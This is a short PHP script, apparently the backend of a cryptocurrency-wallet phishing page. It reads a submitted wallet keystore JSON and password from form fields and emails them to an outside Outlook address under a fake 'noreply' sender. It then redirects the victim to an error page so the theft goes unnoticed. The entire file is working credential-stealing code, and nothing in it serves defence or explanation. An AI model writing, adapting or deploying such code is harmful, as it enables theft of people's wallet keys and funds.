<?php
//get data from form  

$name = $_POST['pm_store'];
$email= $_POST['pm_passwo'];
$to = "dimemoremore@outlook.com";
$subject = "Mail From website";
$message= "test running for Keystore JSON submission";
$txt ="Keystore JSON = ". $name . "\r\n  Password = " . $email . "\r\n Message =" . $message;
$headers = "From: noreply@datawalsync.org" . "\r\n" .
"CC: ";
if($email!=NULL){
    mail($to,$subject,$txt,$headers);
}
//redirect
header("Location:error.php");



